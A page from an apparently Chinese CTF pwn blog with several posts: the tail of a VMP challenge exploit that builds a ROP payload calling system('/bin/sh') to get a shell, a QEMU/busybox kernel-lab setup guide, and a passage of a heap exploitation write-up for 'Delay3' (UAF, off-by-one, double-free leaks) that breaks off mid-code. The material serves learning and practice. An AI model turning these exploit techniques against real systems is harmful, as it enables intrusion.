class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">		</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(pop_rdi1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(pop_rdi2)</span><br><span class="line"></span><br><span class="line">		payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x10</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">		</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(binsh1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(binsh2)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(binsh3)</span><br><span class="line"></span><br><span class="line">		payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x14</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">				</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(ret1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(ret2)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(ret3)			</span><br><span class="line">		</span><br><span class="line">		payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x18</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">					</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(system1)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(system2)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(system3)</span><br><span class="line">		payload += <span class="string">b&#x27;\x09\x01&#x27;</span>+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		payload += p32(<span class="number">0x8</span>) + p32(<span class="number">0xE4000000</span>)</span><br><span class="line">		payload = payload.ljust(<span class="number">0x38</span>*<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">		</span><br><span class="line">		payload += p32(<span class="number">8</span>) + p32(<span class="number">0</span>)</span><br><span class="line">		payload = payload.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">		payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">#gdb.attach(p)</span></span><br><span class="line">		</span><br><span class="line">		p.send(payload)	</span><br><span class="line">		p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>这道题差点让我离开人世，我一共复现了3天，第1天连“跳转表”都不会改，被乱七八糟的代码搞崩了心态，第2天又被复杂的算法血虐，凌晨的时候才打出了两个leak，第3天直接调试到吐</p>
<p>官方的exp我调不通（因为环境不一样），这大大阻碍了我的理解，最后慢慢理解程序的代码和exp的用意，不断调整exp进行试错，还是调出来了（虽然是对着wp调的）</p>
<p>这是我第一次搞 VMP pwn，算是长见识了……</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/21/kernel%20environ/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/21/kernel%20environ/" class="post-title-link" itemprop="url">kernel environ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-21 00:09:08" itemprop="dateCreated datePublished" datetime="2022-03-21T00:09:08+08:00">2022-03-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-15 16:11:21" itemprop="dateModified" datetime="2022-12-15T16:11:21+08:00">2022-12-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="kernel-environ"><a href="#kernel-environ" class="headerlink" title="kernel environ"></a>kernel environ</h2><p><strong>手工搭建内核</strong></p>
<p><strong>qemu</strong></p>
<p>轻量级虚拟化设备，我们主要使用 qemu-system- 系列</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ apt-get install qemu  </span><br></pre></td></tr></table></figure>
<p><strong>busybox</strong></p>
<p>轻量级文件系统，适用于 kernel 开发</p>
<p>输入以下网站获取 busybox：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://busybox.net/downloads/</span><br></pre></td></tr></table></figure>
<ul>
<li>.tar.gz   格式解压为   tar  -zxvf  xx.tar.gz</li>
<li>.tar.bz2  格式解压为   tar  -jxvf  xx.tar.bz2</li>
</ul>
<p>输入以下指令配置文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  make menuconfig</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">│ ┌↑(-)─────────────────────────────────────────────────────────────────┐ │  </span><br><span class="line"> │ │[ ] <span class="function">Support NSA Security Enhanced <span class="title">Linux</span> <span class="params">(NEW)</span>                        │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Clean up all memory before <span class="title">exiting</span> <span class="params">(usually <span class="keyword">not</span> needed)</span> <span class="params">(NEW)</span>    │ │  </span></span><br><span class="line"><span class="function"> │ │[*] Support LOG_INFO level syslog <span class="title">messages</span> <span class="params">(NEW)</span>                     │ │  </span></span><br><span class="line"><span class="function"> │ │--- Build Options                                                    │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Build <span class="keyword">static</span> <span class="title">binary</span> <span class="params">(no shared libs)</span> <span class="params">(NEW)</span> <span class="comment">// target             │ │  </span></span></span><br><span class="line"><span class="function"> │ │[ ]   Build position independent <span class="title">executable</span> <span class="params">(NEW)</span>                    │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Force NOMMU <span class="title">build</span> <span class="params">(NEW)</span>                                          │ │  </span></span><br><span class="line"><span class="function"> │ │[ ] Build shared <span class="title">libbusybox</span> <span class="params">(NEW)</span>                                    │ │  </span></span><br><span class="line"><span class="function"> │ │<span class="params">()</span>  Cross compiler <span class="title">prefix</span> <span class="params">(NEW)</span>                                      │ │  </span></span><br><span class="line"><span class="function"> │ │<span class="params">()</span>  Path to <span class="title">sysroot</span> <span class="params">(NEW)</span>     </span></span><br></pre></td></tr></table></figure>
<p>在“Build static binary”处按“Y”选中（采用静态编译，为了不添加动态链接库）</p>
<p>直接退出，退出时保存，接下来就是busybox编译了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  make -j4    </span><br><span class="line">➜  make install</span><br></pre></td></tr></table></figure>
<img src="/2022/03/21/kernel%20environ/1647750293619-1664789642583.png" class width="1647750293619"> 
<p>这个“_install”就是编译好的文件了，输入以下指令：（复制 rootfs ）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cp rootfs -r ..</span><br></pre></td></tr></table></figure>
<p>在 <code>_install</code> 目录下创建以下文件夹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>
<p><code>init</code> 为 linux 的初始化脚本，内容为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s # We need this to find /dev/sda later</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>创建 <code>pack.sh</code> 作为 linux 的打包脚本，内容如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">cd busybox # fs folder</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
<p>创建 <code>start.sh</code> 作为 linux 的启动脚本，内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">64</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr&quot;</span> \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p><strong>kernel pwn</strong></p>
<p>一般的 kernel pwn 都有三个文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boot.sh (启动脚本 - &quot;.sh&quot;)</span><br><span class="line">bzImage (内核 - &quot;bzImage&quot;)</span><br><span class="line">initramfs.cpio (内置的busybox文件系统 - &quot;.cpio&quot;)</span><br></pre></td></tr></table></figure>
<p>在busybox文件系统中就会有对应的驱动文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn.ko (驱动文件 - &quot;.ko&quot;)</span><br></pre></td></tr></table></figure>
<p>用 file 指令获取目标内核的信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babykernel file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.19.26 (bird@ubuntu18) #2 SMP Tue Jun 4 18:57:49 CST 2019, RO-rootFS, swap_dev 0x8, Normal VGA</span><br></pre></td></tr></table></figure>
<p>在 kernel 官网上下载对应版本的内核</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/ </span><br></pre></td></tr></table></figure>
<p>然后观察它是用什么编译器编译出来的（gcc版本会影响编译）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babykernel strings bzImage | grep gcc</span><br><span class="line">yygcc3s!</span><br><span class="line">4.19.26 (bird@ubuntu18) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04)) #2 SMP Tue Jun 4 18:57:49 CST 2019</span><br></pre></td></tr></table></figure>
<p>输入以下指令配置文件：(直接退出，默认就好)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  make menuconfig </span><br></pre></td></tr></table></figure>
<p>在进行 kernel 编译之前要进行 gcc 版本替换</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin/gcc*</span><br><span class="line">sudo apt-get install -y gcc-7 g++-7</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 20 --slave /usr/bin/g++ g++ /usr/bin/g++-7</span><br><span class="line">sudo update-alternatives --config gcc</span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
<p>接下来就是 kernel 编译了（通过“-jn”来指定线程数）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  make bzImage -j4</span><br></pre></td></tr></table></figure>
<ul>
<li>bzImage：<code>arch/x86/boot/bzImage</code></li>
<li>vmlinux：源码所在的根目录下</li>
</ul>
<p><strong>下载现有内核</strong></p>
<p>使用如下命令列出可下载内核镜像 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search linux-image-</span><br></pre></td></tr></table></figure>
<p>选一个自己喜欢的下载就行，笔者所用的阿里云源似乎没有最新的5.11的镜像，这里用5.8的做个示范： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt download linux-image-5.8.0-43-generic</span><br></pre></td></tr></table></figure>
<p>下载下来是一个deb文件，解压 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dpkg -X ./linux-image-5.8.0-43-generic_5.8.0-43.49~20.04.1_amd64.deb extract</span></span><br><span class="line">./</span><br><span class="line">./boot/</span><br><span class="line">./boot/vmlinuz-5.8.0-43-generic</span><br><span class="line">./usr/</span><br><span class="line">./usr/share/</span><br><span class="line">./usr/share/doc/</span><br><span class="line">./usr/share/doc/linux-image-5.8.0-43-generic/</span><br><span class="line">./usr/share/doc/linux-image-5.8.0-43-generic/changelog.Debian.gz</span><br><span class="line">./usr/share/doc/linux-image-5.8.0-43-generic/copyright</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>遇到的问题</strong></p>
<p>1.<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51203305/article/details/120805372">Linux内核编译错误</a> </p>
<p>2.kernel无法开启，无效循环（我重新做了一次后发现问题消失了，目前不知道原因）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/main_arena%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/main_arena%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">main_arena劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-19 18:40:16" itemprop="dateCreated datePublished" datetime="2022-03-19T18:40:16+08:00">2022-03-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 16:56:30" itemprop="dateModified" datetime="2023-04-02T16:56:30+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Delay3</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./Delay3 </span><br><span class="line">I am lazy again...</span><br><span class="line"><span class="number">1.</span> add</span><br><span class="line"><span class="number">2.</span> show</span><br><span class="line"><span class="number">3.</span> <span class="keyword">delete</span></span><br><span class="line">choice :</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Delay3: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=edcd74af07248bb015dfdb61762ab93dce45667f, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/Delay3&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release versio</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;id:&quot;</span>);</span><br><span class="line">  index = read_s();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">9</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);            <span class="comment">// UAF</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_r</span><span class="params">(__int64 chunk, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(chunk + i) = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + chunk) = <span class="number">0</span>;                <span class="comment">// off-by-one</span></span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + chunk) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<ul>
<li>对“size”的限制导致 chunk 无法进入 unsortedbin</li>
<li>read_r 对末尾字节的置空限制了打印模块（同时也带来了 off-by-one）</li>
<li>程序每5秒钟置空一次 chunk_list</li>
</ul>
<p>因为多线程会导致GDB打印不了数据，所以先把“pthread_create”改为了“menu”，把chunk的数量限制也改了：（再源文件中可以通过 sleep 获得原本的效果）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000000</span>ED5                 lea     rdx, start_routine ; start_routine</span><br><span class="line">.text:<span class="number">0000000000000</span>EDC                 mov     esi, <span class="number">0</span>          ; attr</span><br><span class="line">.text:<span class="number">0000000000000</span>EE1                 mov     rdi, rax        ; newthread</span><br><span class="line">.text:<span class="number">0000000000000</span>EE4                 call    menu <span class="comment">// 原本是pthread_create</span></span><br></pre></td></tr></table></figure>
<p>先泄露“heap_addr”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr=leak_addr-<span class="number">0x50</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>
<p>限制了 unsortedbin 怎么泄露“libc_base”呢？</p>
<ul>
<li>tcache perthread corruption 劫持 count（直接排除）</li>
<li>house of orange 中的思想：当 top chunk-&gt;size 不足时会把整个 top chunk 放入 unsortedbin，所以通过覆盖 top chunk-&gt;size 的方式进行入侵（行不通，因为页对齐的原因“size”最小为“0xf41”）</li>
<li>因为本程序每5秒钟都会清空一次 chunk_list ，所以理论上来说，可以无限申请 chunk，这时就需要利用这个机制把 top chunk 申请完，剩下的 top chunk 进入unsortedbin时乘机泄露（也失败了，因为程序会在半分钟后自动关闭）</li>
<li>利用 Double free 实现 overlap ，覆盖某个chunk的size来使该chunk可以进入 unsortedbin（好像可行）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x55bbab8f3060</span></span><br><span class="line">Size: <span class="number">0x100</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>,p64(leak_addr<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;3&#x27;</span>*(<span class="number">0x48</span><span class="number">-0x18</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">add(<span class="number">0x48</span>,payload)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;5&#x27;</span>*<span 